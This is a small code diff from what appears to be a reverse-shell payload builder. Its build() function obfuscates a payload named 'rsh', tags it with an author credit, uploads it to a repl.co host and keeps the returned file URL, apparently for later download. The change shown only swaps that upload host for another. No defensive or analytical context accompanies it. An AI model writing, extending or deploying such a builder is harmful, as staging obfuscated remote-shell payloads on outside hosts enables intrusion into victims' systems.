@@ -61,7 +61,7 @@ def build():
 
         obf_code = "#UnNoIHwgYnkgTGFjdHVhIzEzNzE=\n"+obfuscate(rsh)
 
-        resp = post('https://rsh.minedrayxio.repl.co/upload', json={"content": obf_code})
+        resp = post('https://rsh.lactua.repl.co/upload', json={"content": obf_code})
 
         file_url = resp.text
 
